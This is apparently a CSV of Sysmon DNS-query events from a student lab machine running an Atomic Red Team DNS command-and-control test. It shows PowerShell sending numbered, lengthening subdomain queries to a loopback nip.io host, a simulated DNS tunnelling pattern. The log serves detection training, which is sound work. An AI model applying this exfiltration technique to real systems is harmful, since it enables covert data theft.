"2025-12-22 14:01:34.420 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166538,"Query: 208.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.497","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166539,"Query: 209.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.543","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166540,"Query: 210.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.588","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166541,"Query: 211.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.632","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166542,"Query: 212.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.677","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166543,"Query: 213.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.720","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166544,"Query: 214.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.762","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.422 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166545,"Query: 215.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.at.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.813","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.422 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166546,"Query: 216.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.ato.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.857","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.422 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166547,"Query: 217.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atom.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.181","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.422 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166548,"Query: 218.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomi.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.224","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.155 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166549,"Query: 219.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomic.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.399","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.424 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166550,"Query: 220.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicr.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.444","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.424 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166551,"Query: 221.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicre.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.487","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.425 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166552,"Query: 222.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicred.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.531","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.425 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166553,"Query: 223.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredt.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.575","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.425 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166554,"Query: 224.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredte.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.620","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.425 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166555,"Query: 225.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredtea.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.664","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166556,"Query: 226.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteam.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.846","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166557,"Query: 227.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteama.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.892","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166558,"Query: 228.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamat.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.936","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166559,"Query: 229.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamato.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.979","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166560,"Query: 230.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatom.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.021","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166561,"Query: 231.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomi.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.065","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166562,"Query: 232.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomic.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.109","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166563,"Query: 233.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicr.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.152","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166564,"Query: 234.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicre.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.197","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166565,"Query: 235.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicred.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.240","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166566,"Query: 236.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredt.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.287","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.428 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166567,"Query: 237.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredte.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.332","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.431 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166568,"Query: 238.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredtea.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.377","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.431 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166569,"Query: 239.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteam.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.422","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.431 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166570,"Query: 240.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteama.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.466","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.431 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166571,"Query: 241.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamat.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.510","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.431 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166572,"Query: 242.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamato.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.553","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.431 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166573,"Query: 243.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatom.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.874","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.432 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166574,"Query: 244.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomi.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.924","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.432 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166575,"Query: 245.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomic.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.967","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
